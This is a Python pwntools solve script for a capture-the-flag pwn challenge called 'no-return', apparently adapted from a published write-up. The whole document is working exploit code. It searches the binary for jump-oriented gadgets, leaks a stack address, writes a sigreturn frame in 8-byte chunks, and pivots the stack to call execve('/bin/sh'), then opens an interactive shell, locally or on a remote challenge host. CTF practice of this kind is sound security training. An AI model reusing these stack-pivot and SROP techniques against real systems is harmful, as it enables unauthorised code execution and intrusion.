#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './no-return'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set sysroot /proc/{pid}/root
    b *0x401099
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
offset = 176
gadget = next(elf.search(asm('add rsp, 0x8 ; jmp qword ptr [rsp - 0x8]')))
gadget2 = next(elf.search(asm('push rsp ; xor rax, rax ; inc rax ; xor rdi, rdi ; inc rdi ; mov rsi, rsp ; mov edx, 8 ; syscall')))

def send_data(data):
    payload = flat({ offset: [gadget, gadget2]}, filler=data)
    leak = u64(io.recv(8))
    io.send(payload)
    return leak

def exploit():
    #7rocky's solve script & write up https://7rocky.github.io/en/ctf/htb-challenges/pwn/no-return/
    global io
    io = initialize()
    with log.progress("Look for gadget to be use & Leak stack"), context.silent:
        gadget3 = next(elf.search(asm('xchg rax, rdx ; fdivp st(1) ; jmp qword ptr [rcx]')))
        gadget4 = next(elf.search(asm('pop rsp ; pop rdi ; pop rsi ; pop rbp ; pop rdx ; pop rcx ; pop rbx ; xor rax, rax ; jmp qword ptr [rdi + 1]')))
        syscall = next(elf.search(asm('syscall')))
        stack = send_data(b"/bin/sh\x00")
    log.info("Gadget: %#x", gadget)
    log.info("Gadget 2: %#x", gadget2)
    log.info("Gadget 3: %#x", gadget3)
    log.info("Gadget 4: %#x", gadget4)
    log.info("Syscall: %#x", syscall)
    log.info("Stack: %#x", stack)
    with log.progress("SROP execve"), context.silent:
        frame = SigreturnFrame()
        frame.rax = constants.SYS_execve
        frame.rip = syscall
        frame.rdi = stack - offset - 8 # "/bin/sh\x00"
        frame.rsi = 0
        frame.rdx = 0

        payload = flat({
                    0 : ["/bin/sh\x00", gadget3, syscall, stack - offset - 1], # For later gadget4 to be jump
                0x30 : [0xf, stack - offset + 0x8], # rdx, rcx
                0x48 : frame, #Fake frame
                    })
        for i in range(8, len(payload), 8):
            send_data(payload[i : i + 8])

    with log.progress("Get shell"), context.silent:
        payload  = flat({offset: [gadget4, stack - offset + 16]})  # rsp
        io.send(payload)

    io.interactive()

if __name__ == '__main__':
    exploit()
